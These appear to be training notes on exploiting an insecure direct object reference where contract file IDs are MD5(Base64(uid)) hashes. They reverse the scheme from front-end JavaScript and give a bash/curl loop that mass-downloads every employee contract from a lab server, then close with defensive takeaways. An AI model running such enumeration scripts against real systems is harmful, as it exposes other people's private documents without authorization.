# Bypassing Encoded References

## Context
- Previous example used **cleartext uids** → easy to enumerate.
- This section: object references are **hashed**, making enumeration harder (but not impossible).

## Scenario: Employee Manager — Contracts page
- Visiting `http://SERVER_IP:PORT/contracts.php` and clicking **Employment_contract.pdf** triggers a download.
- Intercepted request (Burp):
  ```
  POST /download.php
  contract=cdd96d3cc73d1dbdaffa03cc6cd7339b
  ```
- Using a `download.php` handler instead of direct file links is a common practice to avoid other file-based attacks — but the **contract** parameter here is an **MD5 hash**, not cleartext.
- MD5 is a **one-way hash** → can't be decoded directly.

## Step 1 — Try guessing the hashed input
- Attempt hashing likely values (uid, username, filename, etc.) and compare to the captured hash.
- Example attempt:
  ```bash
  echo -n 1 | md5sum
  → c4ca4238a0b923820dcc509a6f75849b
  ```
  - **Doesn't match** → simple uid-only hash is ruled out.
- Could use **Burp Comparer** + fuzzing to test many candidate values.
- If no match is found, the reference *might* be a properly **Secure Direct Object Reference** (unpredictable/unique) — **unless** the hashing logic itself is exposed somewhere (see below).

## Step 2 — Function Disclosure (the fatal flaw)
- Many apps (Angular/React/Vue, etc.) mistakenly perform **sensitive logic in front-end JavaScript**, exposing exactly how values are hashed.
- Source code shows the link calls:
  ```javascript
  javascript:downloadContract('1')
  ```
- And the function itself:
  ```javascript
  function downloadContract(uid) {
      $.redirect("/download.php", {
          contract: CryptoJS.MD5(btoa(uid)).toString(),
      }, "POST", "_self");
  }
  ```
- Reveals the real formula: **MD5( Base64(uid) )**.

## Step 3 — Reproduce the hash
```bash
echo -n 1 | base64 -w 0 | md5sum
→ cdd96d3cc73d1dbdaffa03cc6cd7339b
```
- **Matches** the captured request exactly → hashing scheme fully reversed.
- Tip: use `echo -n` and `base64 -w 0` to avoid trailing newlines, which would otherwise change the resulting hash.

## Mass Enumeration (Hashed IDOR)
### Step 1 — Precompute hashes for a range of uids
```bash
for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done
```
- `tr -d ' -'` strips the trailing space/dash that `md5sum` outputs.
- Produces a list of 10 MD5 hashes corresponding to uids 1–10.

### Step 2 — Automate download requests
```bash
#!/bin/bash

for i in {1..10}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
    done
done
```
- Loops uid 1–10, computes each hash, and sends it as the `contract` POST parameter.
- `curl -sOJ`: silent, saves output using the server-suggested filename (`-J`), writes to disk (`-O`).

### Result
```
contract_006d1236aee3f92b8322299796ba1989.pdf
contract_0b24df25fe628797b3a50ae0724d2730.pdf
...
```
- All 10 employee contracts downloaded successfully — full IDOR exploitation despite hashing.

## Key takeaways
1. **Hashing ≠ security.** A hash only protects a reference if the **input and algorithm stay secret and unpredictable** — hashing alone is not access control.
2. **Front-end code is not a safe place for sensitive logic.** If the hashing formula (input + algorithm) is visible in client-side JS, an attacker can **replicate it exactly**.
3. Once the hashing scheme is reversed, mass enumeration proceeds the same way as cleartext IDOR: compute expected values → script requests → harvest data.
4. Defense: hashing/encoding of object references must be paired with **real back-end authorization checks** — never rely on obscurity, and never expose the logic used to generate "secure-looking" identifiers on the client side.
